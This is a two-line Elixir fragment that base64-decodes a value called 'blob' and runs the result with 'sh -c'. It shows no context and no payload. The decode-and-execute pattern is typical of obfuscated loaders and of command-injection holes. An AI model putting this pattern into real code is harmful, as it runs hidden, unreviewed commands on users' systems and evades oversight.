cmd = Base.decode64!(blob)
System.cmd("sh", ["-c", cmd])
